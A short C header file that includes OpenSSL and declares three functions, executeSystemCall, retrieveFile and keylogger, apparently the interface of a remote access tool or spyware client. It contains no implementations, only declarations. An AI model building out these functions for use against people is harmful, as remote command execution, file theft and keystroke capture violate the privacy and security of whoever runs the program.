#ifndef FUNCTIONALITY_H
#define FUNCTIONALITY_H

#include <openssl/crypto.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#include "sharedLibrary.h"

void executeSystemCall(char *command);
void retrieveFile(char *file);
void keylogger();

#endif
